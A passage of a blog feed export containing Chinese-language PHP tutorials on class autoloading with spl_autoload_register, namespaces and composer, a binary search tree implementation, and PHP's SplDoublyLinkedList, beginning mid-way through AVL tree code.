$root-&gt;bf = EH;</span><br><span class="line">                        $taller   = <span class="keyword">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//在右子树中搜索</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">self</span>::insertAvl($root-&gt;rightNode, $key, $data, $taller)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($taller) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ($root-&gt;bf) &#123; <span class="comment">//检查树的平衡度</span></span><br><span class="line">                    <span class="keyword">case</span> LH:</span><br><span class="line">                        $root-&gt;bf = EH;</span><br><span class="line">                        $taller   = <span class="keyword">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> EH:</span><br><span class="line">                        $root-&gt;bf = RH;</span><br><span class="line">                        $taller   = <span class="keyword">true</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> RH:</span><br><span class="line">                        <span class="keyword">self</span>::rightBalance($root);</span><br><span class="line">                        $taller = <span class="keyword">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP类的自动加载机制</title>
    <url>/2016/coding/php/php-autoload.html</url>
    <content><![CDATA[<h3 id="1-手动加载？"><a href="#1-手动加载？" class="headerlink" title="1.手动加载？"></a>1.手动加载？</h3><p>首先，咱们先想一个问题，为什么需要加载机制？</p>
<p>理论上讲，你可以把所有PHP代码都写在一个文件里面，早期PHP确实有很多这样的代码，因为那时候还没有面向对象的概念，没有代码分层，一个PHP文件里面一大堆函数，一个功能一个函数这么写就行了。</p>
<p>后来，大家都发现这样写起来太乱，不利于维护和扩展，更重要的是有了面向对象的概念，我们可以把属性和方法封装到类里面，然后需要用到的时候就实例化这个类，这从面向过程转向面向对象。</p>
<p>举个例子，现在在同一个文件夹里面有2个类文件 ClassA.php、ClassB.php，还有一个index.php:</p>
<a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$value = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> ClassA();</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
<p>当你在index.php里面new ClassA 的时候没问题，至少这样写是没有语法错误的，现在IDE都很智能，可以自动提示。但是当你运行index.php的时候就会报错：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">PHP Fatal error:  Uncaught Error: Class 'ClassA' not found in /home/jwang/Documents/Work/MyBlog/PHP/Code/index.php:2</span><br></pre></td></tr></table></figure>
<p>有些初学者就会很懵逼，明明这个类就在同一个文件夹下啊，为什么会找不到？</p>
<p>错误提示翻译过来就是: 在index.php 文件里面没有找到 ClassA！ 其实仔细想想，这个文件里面确实没有ClassA。</p>
<p>解决这个问题的方式就是使用 require 、include 关键字加载所需的类，其实PHP解释器在执行这个文件的时候遇到require或者include处理很简单，它就相当于下面这种写法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> ClassA();</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
<p>这时候当然不会报错，其实在MVC的框架里面，PHP执行的自始至终都是index.php这一个文件，只不过框架可以根据路由去加载不同的文件！所谓的加载，其实就是替换，如果没有这种加载机制，那如果你在不同的地方用到同一个类，是不是用到的地方就得copy一份类的代码…</p>
<p>有一点需要注意一下，require或include 不仅仅可以加载文件里面的类，也可以加载文件里面的变量，比如说 ClassA.php 这个文件里面还定义了一个<code>$value = 100</code>, 这时候你就可以在index.php里面直接使用$value了，它的值就是100；</p>
<p>假如说，这时候你在index.php里面也定义了一个$value, 而且值不一样，那就看你在哪里require的，假如你在require之前定义了$value，那就以require文件里面的为准，这就相当于重新赋值了。假如是之后，则以最新当前文件的定义为准！记住PHP代码是顺序执行的就行了</p>
<hr>
<h3 id="2-自动加载"><a href="#2-自动加载" class="headerlink" title="2.自动加载"></a>2.自动加载</h3><p>虽然可以使用require，include去加载不同地方的类，但是还是太麻烦了，用到一个就得写一个，忘了就麻烦了，这时候就需要自动加载机制！</p>
<p>早期的时候可以使用 <strong>__autoload()</strong> 这个魔术方法去实现自动加载，但是现在一般都是建议使用 <strong>spl_autoload_register</strong>，当PHP脚本找不到所需的类时候就会自动调用这个函数！</p>
<p>比如说在上面index.php里面，由于我并没有定义这2个方法的任何一个，所以会报错, 修改一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span> <span class="params">($class)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">require</span> $class.<span class="string">".php"</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> ClassA();</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
<p>可以定义多个spl_autoload_register 从不同的地方加载，而__autoload函数则不能重复定义。</p>
<p>需要注意的是，因为PHP是顺序执行的，这个函数必须在new之前定义，函数参数是一个函数，你也可以传一个匿名函数，只有一个参数，是需要加载的类的名称，由于这里并没有使用命名空间（后面再讲），所以在这里这个 $class 的值就是 ClassA。既然我们都知道类的名称了，我们就可以在这里去require或include所需的文件类。</p>
<blockquote>
<p>有一点需要说明一下，按标准来说，一个文件一个类，而且类的名字必须和文件名字一样（至少是有规律的），你要是不按这套路来，那可就没辙了！</p>
</blockquote>
<hr>
<h3 id="3-命名空间"><a href="#3-命名空间" class="headerlink" title="3.命名空间"></a>3.命名空间</h3><p>上面的例子里面，虽然解决了自动加载问题，但是依然有一个问题，假如现在多了一个文件夹App，我们把 ClassB 放到 App 文件夹里面，再运行代码，你会发现还是找不到ClassB，require会报错。</p>
<p>有好几种解决方法，你可以在require的时候判断文件是否存在，先在当前文件夹下找，如果不存在就去App文件找，把可能存在的地方都找一遍，如果都找不到就报错！</p>
<p>但是这种方法效率很低，有一些框架会采用文件命名带上文件夹名的方式解决这些问题，比如说把ClassB.php 改成 App_ClassB.php，这样就可以根据文件名找到文件，带来的后果就是文件夹名字超级长…不是太优雅！</p>
<p>默认情况下，如果你没有使用命名空间，所有文件都在同一个命名空间下全局(), 使用命名空间来改造上面的代码：</p>
<p>ClassA.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ClassB.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这时候如果想在index.php里面使用ClassB，有两种选择，一种是写上命名空间<code>$a = new \App\ClassB()</code>,另一种则是使用user关键字:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">ClassA</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">ClassB</span>;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span> <span class="params">($class)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">require</span> $class.<span class="string">".php"</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> ClassA();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> ClassB();</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
<p>但是这时候依然无法正常加载，因为这时候$class的值是 <strong>App\ClassB</strong>, 带上了命名空间，为了能正常加载我们需要改造一下自动加载函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"APP_PATH"</span>, <span class="keyword">__DIR__</span>);</span><br><span class="line"></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span> <span class="params">($file)</span> </span>&#123;</span><br><span class="line">    $file = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, trim($file, <span class="string">'App'</span>));</span><br><span class="line">    <span class="keyword">include</span> APP_PATH.<span class="string">'/app'</span>.$file.<span class="string">".php"</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>简单的说，只是处理一下目录分隔符和路径！命名空间并不是为了解决自动加载问题，命名空间主要是为了解决类名重复问题，但是有命名空间我们就可以更容易的实现自动加载！</p>
<hr>
<h3 id="4-composer自动加载"><a href="#4-composer自动加载" class="headerlink" title="4.composer自动加载"></a>4.composer自动加载</h3><p>现在很多框架更多的是使用composer实现自动加载，使用一些第三方的类库也更方便，即使我们不使用第三方类库，composer也很好用！基本步骤如下：</p>
<p>第一步，安装composer，这个我就不多说了，如果在Ubuntu下面，可以执行 <code>sudo apt install composer</code></p>
<p>第二步，在项目根目录执行 <code>composer init</code> 进行初始化操作，当然你可以自己新建一个composer.json 文件,如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"root/auto-load"</span>,</span><br><span class="line">    <span class="attr">"authors"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"wangbenjun"</span>,</span><br><span class="line">            <span class="attr">"email"</span>: <span class="string">"wangbenjun@gmail.com"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"require"</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第三步，配置自动加载选项，composer主要有一下2个配置选项用于配置自动加载, 其中dev是用于开发环境：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">"autoload": &#123;</span><br><span class="line">       "classmap": [</span><br><span class="line">           <span class="string">"lib"</span></span><br><span class="line">       ],</span><br><span class="line">       "psr-4": &#123;</span><br><span class="line">           "App\\": "app/"</span><br><span class="line">       &#125;</span><br><span class="line"> &#125;,</span><br><span class="line">"autoload-dev": &#123;</span><br><span class="line">       "psr-4": &#123;</span><br><span class="line">           "Tests\\": "tests/"</span><br><span class="line">       &#125;</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure>
<p>classmap 是类映射, 用于处理那些没有使用命名空间的类库文件夹，composer使用了一个关联数组给里面所有的文件做了一个映射，便于快速找到所需的类。psr-4 则是处理使用了命名空间的文件夹</p>
<p>修改完了之后执行 <code>composer dumpautoload</code> 就可以生成自动加载文件，可以看到多出一个vendor文件夹，在index.php里面require里面的autoload.php就可以实现自动加载了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">ClassA</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">ClassB</span>;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> ClassA();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> ClassB();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> SomeClass();</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br><span class="line">var_dump($b);</span><br><span class="line">var_dump($c);</span><br></pre></td></tr></table></figure>

<p>最终目录结构如下图：</p>
<img src = "/images/old/5f6e3e27ly1fx1uzv0zpuj208n0723yl.jpg" />

<p>现在大多数Web框架都是采用MVC模式，一般都有一个统一的入口文件，比如index.php, 通常会在这个入口文件定义自动加载机制，使用composer的话只需要include一个autoload.php文件即可！</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP数据结构之二叉树</title>
    <url>/2015/coding/php/php-datastruct-btree.html</url>
    <content><![CDATA[<p>有一点需要说明，一般讲算法是不会用PHP来实现的，而且实际应用中用PHP来实现也木有多大意思，所以这里用PHP实现的意思在于方便大家熟悉，了解其中概念。</p>
<p>如果要讲二叉树，肯定得先讲讲树，这里也不讲了，只讲一点，二叉树是一种特殊的树，这里为什么说是二叉树而不是三叉树呢？看图</p>
<p>这是典型的树结构图：</p>
<img src = "/images/old/5f6e3e27ly1fv8v3f7a7pj20do0asgn6.jpg" />

<a id="more"></a>

<p>这是典型的二叉树结构图：</p>
<img src = "/images/old/5f6e3e27ly1fv8v3mm7k1j20mu0cqq6u.jpg" />

<p>区别就在于二叉树每一个树节点最多只有2个子树，但是树就不一定了，可能有一个子树或者多个子树</p>
<p>不过这个和二叉树相关的概念还很多，什么满二叉树，完全二叉树，平衡二叉树，红黑树…这里也不多说了，想要完全消化估计得花时间多看看算法书了，这里就说个最简单的吧！</p>
<p>这里实现的二叉树其实是二叉排序树, 又称二叉查找树</p>
<p>下面就用PHP来实现一个【二叉排序树】插入，查找，以及遍历操作：</p>
<h3 id="1-插入"><a href="#1-插入" class="headerlink" title="1.插入"></a>1.插入</h3><p>首先，先定义一个节点，这个节点有4个属性，节点key你可以理解为数组下标，然后是节点数据data，这里面可以存储你想要的数据，然后是一个左节点，一个右节点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $leftNode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $rightNode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($key, $data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key  = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;key . <span class="string">'---&gt;'</span> . <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了方便，节点的所有属性都是public的，可以直接引用, 下面是树的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tree</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Node</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> $root = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 插入</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $data</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($key, $data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $node = <span class="keyword">new</span> Node($key, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;root == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;root = $node;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $current = <span class="keyword">$this</span>-&gt;root;</span><br><span class="line">            $parent  = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                $parent = $current;</span><br><span class="line">                <span class="comment">// 如果数字比当前节点小，则存左边</span></span><br><span class="line">                <span class="keyword">if</span> ($key &lt; $current-&gt;key) &#123;</span><br><span class="line">                    $current = $current-&gt;leftNode;</span><br><span class="line">                    <span class="keyword">if</span> ($current == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        $parent-&gt;leftNode = $node;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $current = $current-&gt;rightNode;</span><br><span class="line">                    <span class="keyword">if</span> ($current == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        $parent-&gt;rightNode = $node;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里定义了一个root用来存放根节点，插入操作可以分为几步：</p>
<ol>
<li>先初始化这个节点的数据</li>
<li>判断根节点是否为空，如果为空，就把当前节点当作根节点，插入结束</li>
<li>如果根节点不为空，那把根节点当作起始节点开始一个递归遍历过程</li>
<li>如果当前的节点的key大于起始节点，那么就把起始节点的右子节点当作起始节点，同时判断起始节点是否为空，如果为空，则说明已经到头了，插入节点</li>
</ol>
<p>文字描述的不准确，大家结合代码多理解一下</p>
<p>下面写一些代码测试一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$tree = <span class="keyword">new</span> Tree();</span><br><span class="line">$tree-&gt;insert(<span class="number">56</span>, <span class="string">'AbC'</span>);</span><br><span class="line">$tree-&gt;insert(<span class="number">16</span>, <span class="string">'Jack'</span>);</span><br><span class="line">$tree-&gt;insert(<span class="number">6</span>, <span class="string">'Baby'</span>);</span><br><span class="line">$tree-&gt;insert(<span class="number">61</span>, <span class="string">'Luck'</span>);</span><br><span class="line">$tree-&gt;insert(<span class="number">180</span>, <span class="string">'Ketty'</span>);</span><br><span class="line">$tree-&gt;insert(<span class="number">69</span>, <span class="string">'LA'</span>);</span><br><span class="line">$tree-&gt;insert(<span class="number">51</span>, <span class="string">'Buck'</span>);</span><br><span class="line">$tree-&gt;insert(<span class="number">47</span>, <span class="string">'Jun'</span>);</span><br><span class="line">$tree-&gt;insert(<span class="number">25</span>, <span class="string">'Hello'</span>);</span><br><span class="line">$tree-&gt;insert(<span class="number">5</span>, <span class="string">'Name'</span>);</span><br><span class="line">$tree-&gt;insert(<span class="number">23</span>, <span class="string">'Data'</span>);</span><br><span class="line">$tree-&gt;insert(<span class="number">18</span>, <span class="string">'Where'</span>);</span><br></pre></td></tr></table></figure>
<p>可以用xdebug查看一下生成的结构是否正确</p>
<img src = "/images/old/5f6e3e27ly1fv8w7e530aj20cv0k1q3x.jpg" />

<h3 id="2-查找"><a href="#2-查找" class="headerlink" title="2.查找"></a>2.查找</h3><p>二叉树的结构生成了，如果查找呢？查找其实还算简单的，也是从根节点开始递归遍历, 判断根节点的key是否等于需要查找的key，如果不等于判断是大还是获取其子树节点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $current = <span class="keyword">$this</span>-&gt;root;</span><br><span class="line">    <span class="keyword">while</span> ($key != $current-&gt;key) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($key &gt; $current-&gt;key) &#123;</span><br><span class="line">            $current = $current-&gt;rightNode;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $current = $current-&gt;leftNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($current == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-翻转"><a href="#3-翻转" class="headerlink" title="3.翻转"></a>3.翻转</h3><p>然后再看看翻转二叉树：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">inverse</span><span class="params">($root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($root == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $tmp = $root-&gt;leftNode;</span><br><span class="line"></span><br><span class="line">    $root-&gt;leftNode  = <span class="keyword">$this</span>-&gt;inverse($root-&gt;rightNode);</span><br><span class="line">    $root-&gt;rightNode = <span class="keyword">$this</span>-&gt;inverse($tmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>翻转有很多种算法，我这里只写了一个最简单的递归算法，比较容易理解！</p>
<h3 id="4-遍历"><a href="#4-遍历" class="headerlink" title="4.遍历"></a>4.遍历</h3><p>二叉树遍历又分为前序遍历，中序遍历，以及后序遍历，其实没啥区别，区别就在于 echo 那行输出节点的代码位置，这里用的还是递归算法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 前序遍历算法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $node</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">preOrderTraverse</span><span class="params">($node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($node == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> $node-&gt;key . <span class="string">'---&gt;'</span> . $node-&gt;data . <span class="string">"\n"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">$this</span>-&gt;preOrderTraverse($node-&gt;leftNode);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;preOrderTraverse($node-&gt;rightNode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP数据结构之双向链表</title>
    <url>/2015/coding/php/php-double-linklist.html</url>
    <content><![CDATA[<p>其实这些都是PHP SPL 标准库里面的东西, SPL是用于解决典型问题(standard problems)的一组接口与类的集合。说白了，这是PHP官方实现的一些数据结构,<br>印象中Java的标准库就很强大，不要慌，PHP也有。</p>
<img src = "/images/old/5f6e3e27ly1fv0rjzmm26j20hz0himyz.jpg" />

<p>按顺序来，先讲一下这个双向链表(double link list)，数据结构讲的是思想，不分编程语言，所以先回顾一下基本概念吧。</p>
<a id="more"></a>

<blockquote>
<p>链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，<br>结点可以在运行时动态生成。每个结点包括两个部分：一个是存储数据元素的数据域，另一个是存储下一个结点地址的指针域, 相比于线性表顺序结构，操作复杂。</p>
</blockquote>
<p>这是百度百科的介绍，不黑不吹，讲的还是非常准确的。我觉得链表最大的特点就是 非连续和非顺序存储，和其对应的就是数组，大家都知道数组在内存里面是连续存储的,<br>由于是连续存储，操作系统在每次分配内存的时候并不一定刚好有那么大小的一块连续的内存，于是就会产生内存碎片。而且数组还有一点不好，想找一个数得从头开始一个个找,<br>其查找时间是O(n),链表是O(1)。总的来说，链表是为了解决数组的不足。</p>
<p>有一点需要说一下，PHP的数组并不是传统意义的数组，在C和Go等语言里面，数组是一个固定大小，固定类型的数据集合，但是PHP的数组啥都干,其功能应该是集了数组，切片，链表，map等数据结构的综合体,<br>在很多其它编程语言里面，这些数据结构是分的非常清楚。所以有时候理解这些概念的时候，不要拿PHP的数组对号入座哈。</p>
<p>借2张图理解一下：</p>
<img src="/images/old/5f62e3e2x7ly1fv0rjzmxm26j20hz0him1yz.jpg" >

<p>举个形象的例子，这个链表就有点像链条，每一个链条单元是首尾相接，自行车链条就是环型链表，而数组就是铁轨，直的，虽然跑的快, 但是要求高！</p>
<p>如果用PHP去实现链表倒是不难，毕竟PHP这么强大，可以用数组模拟，但是性能并不高，这里就看一下官方的实现吧：</p>
<img src = "/images/old/5f6e3e27ly1fv0sjz2p5qj20ke0mzdis.jpg" />

<p>可以看到这个类实现了Iterator，arrayAccess等接口，就意味着可以像数组一样访问这个对象，有push,pop,shift,unshift,current等方法。</p>
<p>举个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dll = <span class="keyword">new</span> SplDoublyLinkedList();</span><br><span class="line">$dll-&gt;add(<span class="number">0</span>, <span class="string">'a'</span>);</span><br><span class="line">$dll-&gt;add(<span class="number">1</span>, <span class="string">'b'</span>);</span><br><span class="line">$dll-&gt;add(<span class="number">2</span>, <span class="string">'c'</span>);</span><br><span class="line">$dll-&gt;add(<span class="number">3</span>, <span class="string">'d'</span>);</span><br><span class="line">$dll-&gt;add(<span class="number">4</span>, <span class="string">'e'</span>);</span><br><span class="line"></span><br><span class="line">var_dump($dll);</span><br><span class="line">var_dump($dll-&gt;pop()); <span class="comment"># 右边出列</span></span><br><span class="line">var_dump($dll-&gt;shift()); <span class="comment"># 左边出列</span></span><br><span class="line"></span><br><span class="line">var_dump($dll-&gt;bottom()); <span class="comment"># 第一个节点</span></span><br><span class="line">var_dump($dll-&gt;top());    <span class="comment"># 最后一个节点</span></span><br><span class="line"></span><br><span class="line">$dll-&gt;unshift(<span class="string">'b'</span>); <span class="comment"># 左边入列</span></span><br><span class="line">$dll-&gt;push(<span class="string">'d'</span>); <span class="comment"># 右边入列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数组遍历</span></span><br><span class="line"><span class="keyword">foreach</span> ($dll <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    var_dump($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dll-&gt;push(<span class="string">'f'</span>);</span><br><span class="line"></span><br><span class="line">$dll-&gt;setIteratorMode(SplDoublyLinkedList::IT_MODE_FIFO); <span class="comment"># FIFO first insert first out</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//循环遍历</span></span><br><span class="line"><span class="keyword">for</span> ($dll-&gt;rewind(); $dll-&gt;valid(); $dll-&gt;next()) &#123;</span><br><span class="line">    var_dump($dll-&gt;current()) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里还有一个 setIteratorMode 函数用于设置迭代器模式，它有4种模式，LIFO，FIFO，DELETE，KEEP。LIFO,是last in first out，即后进先出,<br>这种模式其实就是栈模式，栈是一种很常见的数据结构，最广泛的用途莫过于函数调用栈了。FIFO是队列模式，先进先出。DELETE是删除模式，KEEP是遍历模式，<br>默认是FIFO模式。</p>
<p>可见PHP这个双向链表还可以当栈和队列使用，没错！其实后面的 SplStack 和 SplQueue 就是继承的 SplDoublyLinkedList，完全一模一样，就是改个名字而已！</p>
